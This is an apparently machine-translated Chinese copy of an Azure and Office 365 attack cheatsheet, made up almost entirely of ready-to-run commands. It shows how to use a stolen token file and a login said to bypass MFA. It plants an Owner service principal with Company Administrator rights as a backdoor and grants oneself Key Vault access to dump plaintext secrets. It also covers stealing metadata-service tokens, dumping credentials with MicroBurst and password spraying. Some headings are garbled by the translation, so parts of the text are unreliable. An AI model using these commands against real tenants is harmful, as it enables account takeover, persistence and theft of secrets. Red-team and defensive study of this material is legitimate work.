<html>
<head>
<title>Microsoft Azure &amp; O365 CLI Tool Cheatsheet</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Microsoft Azure &amp; O365 CLI工具备忘单</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/microsoft-azure-o365-cli-tool-cheatsheet-505469579584?source=collection_archive---------1-----------------------#2021-09-04">https://infosecwriteups.com/microsoft-azure-o365-cli-tool-cheatsheet-505469579584?source=collection_archive---------1-----------------------#2021-09-04</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/4477861f910fa4ad43c34f4edecc67cf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*8NXgwDr_HYPJsAoA"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">Unsplash.com</figcaption></figure><h1 id="0b54" class="kc kd iq bd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz bi translated">侦察</h1><p id="962d" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">获取目标域的联盟信息</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="49d9" class="mh kd iq md b gy mi mj l mk ml"><a class="ae mm" href="https://login.microsoftonline.com/getuserrealm.srf?login=username@targetdomain.com&amp;xml=1" rel="noopener ugc nofollow" target="_blank">https://login.microsoftonline.com/getuserrealm.srf?login=username@targetdomain.com&amp;xml=1</a></span></pre><p id="dfab" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">获取目标域的租户ID</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="7ecb" class="mh kd iq md b gy mi mj l mk ml">https://login.microsoftonline.com/&lt;target domain&gt;/v2.0/.well-known/openid-configuration</span></pre><h1 id="c01a" class="kc kd iq bd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz bi translated">Az PowerShell模块</h1><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="8ae0" class="mh kd iq md b gy mi mj l mk ml">Import-Module Az</span></pre><h2 id="7b03" class="mh kd iq bd ke ms mt dn ki mu mv dp km ll mw mx kq lp my mz ku lt na nb ky nc bi translated">证明</h2><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="6ede" class="mh kd iq md b gy mi mj l mk ml">Connect-AzAccount</span><span id="81d5" class="mh kd iq md b gy nd mj l mk ml">## Or this way sometimes gets around MFA restrictions</span><span id="07b6" class="mh kd iq md b gy nd mj l mk ml">$credential = Get-Credential<br/>Connect-AzAccount -Credential $credential</span></pre><p id="cc77" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">导入上下文文件</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="92d5" class="mh kd iq md b gy mi mj l mk ml">Import-AzContext -Profile 'C:\Temp\Live Tokens\StolenToken.json'</span></pre><p id="b81f" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">导出上下文文件</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="c3d1" class="mh kd iq md b gy mi mj l mk ml">Save-AzContext -Path C:\Temp\AzureAccessToken.json</span></pre><h2 id="6406" class="mh kd iq bd ke ms mt dn ki mu mv dp km ll mw mx kq lp my mz ku lt na nb ky nc bi translated">账户信息</h2><p id="10fb" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">列出当前可用的Azure上下文</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="b485" class="mh kd iq md b gy mi mj l mk ml">Get-AzContext -ListAvailable</span></pre><p id="6555" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">获取上下文详细信息</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="bff6" class="mh kd iq md b gy mi mj l mk ml">$context = Get-AzContext<br/>$context.Name<br/>$context.Account</span></pre><p id="49fb" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">列表订阅</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="799b" class="mh kd iq md b gy mi mj l mk ml">Get-AzSubscription</span></pre><p id="3f32" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">选择订阅</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="d09f" class="mh kd iq md b gy mi mj l mk ml">Select-AzSubscription -SubscriptionID "SubscriptionID"</span></pre><p id="15f4" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">获取当前用户的角色分配</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="a52f" class="mh kd iq md b gy mi mj l mk ml">Get-AzRoleAssignment</span></pre><p id="4a81" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">列出所有资源和资源组</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="961e" class="mh kd iq md b gy mi mj l mk ml">Get-AzResource<br/>Get-AzResourceGroup</span></pre><p id="6ccf" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">列出存储帐户</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="85fe" class="mh kd iq md b gy mi mj l mk ml">Get-AzStorageAccount</span></pre><h2 id="542f" class="mh kd iq bd ke ms mt dn ki mu mv dp km ll mw mx kq lp my mz ku lt na nb ky nc bi translated">web应用程序和SQL</h2><p id="1a5c" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">列出Azure web应用程序</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="afc2" class="mh kd iq md b gy mi mj l mk ml">Get-AzAdApplication<br/>Get-AzWebApp</span></pre><p id="247d" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">列出SQL服务器</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="ce4e" class="mh kd iq md b gy mi mj l mk ml">Get-AzSQLServer</span></pre><p id="6897" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">可以列出单个数据库以及从上一个命令中检索到的信息</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="f2bc" class="mh kd iq md b gy mi mj l mk ml">Get-AzSqlDatabase -ServerName $ServerName -ResourceGroupName $ResourceGroupName</span></pre><p id="4c65" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">列出SQL防火墙规则</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="6797" class="mh kd iq md b gy mi mj l mk ml">Get-AzSqlServerFirewallRule –ServerName $ServerName -ResourceGroupName $ResourceGroupName</span></pre><p id="f76f" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">列出SQL Server管理员</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="ea04" class="mh kd iq md b gy mi mj l mk ml">Get-AzSqlServerActiveDirectoryAdminstrator -ServerName $ServerName -ResourceGroupName $ResourceGroupName</span></pre><h2 id="87ea" class="mh kd iq bd ke ms mt dn ki mu mv dp km ll mw mx kq lp my mz ku lt na nb ky nc bi translated">运行手册</h2><p id="b589" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">列出Azure运行手册</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="a02b" class="mh kd iq md b gy mi mj l mk ml">Get-AzAutomationAccount<br/>Get-AzAutomationRunbook -AutomationAccountName &lt;AutomationAccountName&gt; -ResourceGroupName &lt;ResourceGroupName&gt;</span></pre><p id="b74f" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">使用以下内容导出操作手册:</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="b112" class="mh kd iq md b gy mi mj l mk ml">Export-AzAutomationRunbook -AutomationAccountName $AccountName -ResourceGroupName $ResourceGroupName -Name $RunbookName -OutputFolder .\Desktop\</span></pre><h2 id="688a" class="mh kd iq bd ke ms mt dn ki mu mv dp km ll mw mx kq lp my mz ku lt na nb ky nc bi translated">虚拟机</h2><p id="2959" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">列出虚拟机并获取操作系统详细信息</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="d05a" class="mh kd iq md b gy mi mj l mk ml">Get-AzVM<br/>$vm = Get-AzVM -Name "VM Name" <br/>$vm.OSProfile</span></pre><p id="fd79" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">在虚拟机上运行命令</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="d475" class="mh kd iq md b gy mi mj l mk ml">Invoke-AzVMRunCommand -ResourceGroupName $ResourceGroupName -VMName $VMName -CommandId RunPowerShellScript -ScriptPath ./powershell-script.ps1</span></pre><h2 id="a402" class="mh kd iq bd ke ms mt dn ki mu mv dp km ll mw mx kq lp my mz ku lt na nb ky nc bi translated">建立工作关系网</h2><p id="c56c" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">列出虚拟网络</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="f76a" class="mh kd iq md b gy mi mj l mk ml">Get-AzVirtualNetwork</span></pre><p id="3cd6" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">列出分配给虚拟网卡的公共IP地址</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="32d6" class="mh kd iq md b gy mi mj l mk ml">Get-AzPublicIpAddress</span></pre><p id="2a08" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">获取Azure ExpressRoute (VPN)信息</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="3134" class="mh kd iq md b gy mi mj l mk ml">Get-AzExpressRouteCircuit</span></pre><p id="9b03" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">获取Azure VPN信息</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="48ac" class="mh kd iq md b gy mi mj l mk ml">Get-AzVpnConnection</span></pre><h2 id="e7ee" class="mh kd iq bd ke ms mt dn ki mu mv dp km ll mw mx kq lp my mz ku lt na nb ky nc bi translated">后门</h2><p id="7f1a" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">创建一个新的Azure服务主体作为后门</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="d9f3" class="mh kd iq md b gy mi mj l mk ml">$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner<br/>$spn<br/>$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)<br/>$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)<br/>$UnsecureSecret<br/>$sp = Get-MsolServicePrincipal -AppPrincipalId &lt;AppID&gt;<br/>$role = Get-MsolRole -RoleName "Company Administrator"<br/>Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId<br/>#Enter the AppID as username and what was returned for $UnsecureSecret as the password in the Get-Credential prompt<br/>$cred = Get-Credential<br/>Connect-AzAccount -Credential $cred -Tenant “tenant ID" -ServicePrincipal</span></pre><h1 id="c9c9" class="kc kd iq bd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz bi translated">MSOnline PowerShell模块</h1><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="5c25" class="mh kd iq md b gy mi mj l mk ml">Import-Module MSOnline</span></pre><h2 id="2277" class="mh kd iq bd ke ms mt dn ki mu mv dp km ll mw mx kq lp my mz ku lt na nb ky nc bi translated">证明</h2><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="cfb5" class="mh kd iq md b gy mi mj l mk ml">Connect-MsolService</span><span id="481c" class="mh kd iq md b gy nd mj l mk ml">## Or this way sometimes gets around MFA restrictions</span><span id="5640" class="mh kd iq md b gy nd mj l mk ml">$credential = Get-Credential<br/>Connect-MsolService -Credential $credential</span></pre><h2 id="7133" class="mh kd iq bd ke ms mt dn ki mu mv dp km ll mw mx kq lp my mz ku lt na nb ky nc bi translated">帐户和目录信息</h2><p id="0a0c" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">列出公司信息</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="494f" class="mh kd iq md b gy mi mj l mk ml">Get-MSolCompanyInformation</span></pre><p id="01f7" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">列出所有用户</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="9a43" class="mh kd iq md b gy mi mj l mk ml">Get-MSolUser -All</span></pre><p id="8733" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">列出所有组</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="df46" class="mh kd iq md b gy mi mj l mk ml">Get-MSolGroup -All</span></pre><p id="c296" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">列出组成员(在本例中为全局管理员)</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="668c" class="mh kd iq md b gy mi mj l mk ml">Get-MsolRole -RoleName "Company Administrator"<br/>Get-MSolGroupMember –GroupObjectId $GUID</span></pre><p id="1364" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">列出所有用户属性</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="5e78" class="mh kd iq md b gy mi mj l mk ml">Get-MSolUser –All | fl</span></pre><p id="b90c" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">列出服务主体</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="17d9" class="mh kd iq md b gy mi mj l mk ml">Get-MsolServicePrincipal</span></pre><p id="da99" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">在所有Azure AD用户属性中搜索密码的一行程序</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="325c" class="mh kd iq md b gy mi mj l mk ml">$users = Get-MsolUser; foreach($user in $users){$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; foreach($prop in $props){if($user.$prop -like "*password*"){Write-Output ("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop)}}}</span></pre><h1 id="8ba9" class="kc kd iq bd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz bi translated">Az CLI工具</h1><h2 id="0cfe" class="mh kd iq bd ke ms mt dn ki mu mv dp km ll mw mx kq lp my mz ku lt na nb ky nc bi translated">证明</h2><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="5f85" class="mh kd iq md b gy mi mj l mk ml">az login</span></pre><h2 id="b607" class="mh kd iq bd ke ms mt dn ki mu mv dp km ll mw mx kq lp my mz ku lt na nb ky nc bi translated">转储Azure密钥库</h2><p id="be41" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">列出当前帐户可以查看的任何密钥保管库资源</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="8809" class="mh kd iq md b gy mi mj l mk ml">az keyvault list –query '[].name' --output tsv</span></pre><p id="3b6e" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">有了贡献者级别的访问权限，您可以给自己获得机密的适当权限。</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="10b3" class="mh kd iq md b gy mi mj l mk ml">az keyvault set-policy --name &lt;KeyVaultname&gt; --upn &lt;YourContributorUsername&gt; --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list</span></pre><p id="1c5d" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">让URI负责钥匙库</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="4651" class="mh kd iq md b gy mi mj l mk ml">az keyvault secret list --vault-name &lt;KeyVaultName&gt; --query '[].id' --output tsv</span></pre><p id="ad2b" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">从keyvault获取明文秘密</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="8cfd" class="mh kd iq md b gy mi mj l mk ml">az keyvault secret show --id &lt;URI from last command&gt; | ConvertFrom-Json</span></pre><h1 id="752a" class="kc kd iq bd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz bi translated">元数据服务URL</h1><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="c80f" class="mh kd iq md b gy mi mj l mk ml"><a class="ae mm" href="http://169.254.169.254/metadata" rel="noopener ugc nofollow" target="_blank">http://169.254.169.254/metadata</a></span></pre><p id="db2f" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">从元数据服务获取访问令牌</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="593f" class="mh kd iq md b gy mi mj l mk ml">GET 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/' HTTP/1.1 Metadata: true</span></pre><h1 id="4652" class="kc kd iq bd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz bi translated">其他Azure和O365工具</h1><h2 id="0993" class="mh kd iq bd ke ms mt dn ki mu mv dp km ll mw mx kq lp my mz ku lt na nb ky nc bi translated">下击暴流</h2><p id="c21b" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">Azure安全评估工具</p><p id="8f1c" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated"><a class="ae mm" href="https://github.com/NetSPI/MicroBurst" rel="noopener ugc nofollow" target="_blank">https://github.com/NetSPI/MicroBurst</a></p><p id="5f1f" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">寻找开放的存储blobs</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="1bf9" class="mh kd iq md b gy mi mj l mk ml">Invoke-EnumerateAzureBlobs -Base $BaseName</span></pre><p id="03ae" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">导出SSL/TLS证书</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="db2b" class="mh kd iq md b gy mi mj l mk ml">Get-AzPasswords -ExportCerts Y</span></pre><p id="4d18" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">Azure容器注册表转储</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="6c66" class="mh kd iq md b gy mi mj l mk ml">Get-AzPasswords<br/>Get-AzACR</span></pre><h2 id="c6af" class="mh kd iq bd ke ms mt dn ki mu mv dp km ll mw mx kq lp my mz ku lt na nb ky nc bi translated">PowerZure</h2><p id="b6b7" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">Azure安全评估工具</p><p id="f0d0" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">https://github.com/hausec/PowerZure<a class="ae mm" href="https://github.com/hausec/PowerZure" rel="noopener ugc nofollow" target="_blank"/></p><h2 id="d61d" class="mh kd iq bd ke ms mt dn ki mu mv dp km ll mw mx kq lp my mz ku lt na nb ky nc bi translated">道路工具</h2><p id="b1c0" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">与Azure AD交互的框架</p><p id="6eaa" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated">【https://github.com/dirkjanm/ROADtools T4】</p><h2 id="f102" class="mh kd iq bd ke ms mt dn ki mu mv dp km ll mw mx kq lp my mz ku lt na nb ky nc bi translated">风暴观察者</h2><p id="47f7" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">用于绘制Azure和Azure AD对象的Red team工具</p><p id="e650" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated"><a class="ae mm" href="https://github.com/Azure/Stormspotter" rel="noopener ugc nofollow" target="_blank">https://github.com/Azure/Stormspotter</a></p><h2 id="13a2" class="mh kd iq bd ke ms mt dn ki mu mv dp km ll mw mx kq lp my mz ku lt na nb ky nc bi translated">MSOLSpray</h2><p id="60df" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">密码喷射工具Azure/O365</p><p id="fb2a" class="pw-post-body-paragraph la lb iq lc b ld mn lf lg lh mo lj lk ll mp ln lo lp mq lr ls lt mr lv lw lx ij bi translated"><a class="ae mm" href="https://github.com/dafthack" rel="noopener ugc nofollow" target="_blank">https://github.com/dafthack</a></p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="d4e4" class="mh kd iq md b gy mi mj l mk ml">Import-Module .\MSOLSpray.ps1<br/>Invoke-MSOLSpray -UserList .\userlist.txt -Password Spring2020</span></pre></div></div>    
</body>
</html>